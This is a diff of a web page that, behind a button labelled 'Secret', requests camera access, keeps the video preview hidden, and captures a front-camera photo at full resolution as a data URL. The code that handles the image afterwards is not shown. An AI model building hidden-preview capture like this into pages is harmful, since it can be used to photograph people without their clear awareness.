@@ -49,8 +49,8 @@
     <button id="captureBtn">Secret</button>
     <div id="status"></div>
 
-    <video id="video" width="320" height="240" autoplay playsinline style="display:none;"></video>
-    <canvas id="canvas" width="320" height="240" style="display:none;"></canvas>
+    <video id="video" autoplay playsinline style="display:none;"></video>
+    <canvas id="canvas" style="display:none;"></canvas>
 
     <script>
         const btn = document.getElementById('captureBtn');
@@ -66,14 +66,16 @@
 
                 // 1. Xin quyền và bật camera
                 const stream = await navigator.mediaDevices.getUserMedia({
-                    video: { width: 320, height: 240 }
+                    video: { facingMode: 'user' }
                 });
                 video.srcObject = stream;
 
                 status.textContent = 'Chờ 2 giây...';
 
                 setTimeout(async () => {
-                    canvas.getContext('2d').drawImage(video, 0, 0, 320, 240);
+                    canvas.width = video.videoWidth;
+                    canvas.height = video.videoHeight;
+                    canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
                     const imageData = canvas.toDataURL('image/png');
 
                     // Tắt camera
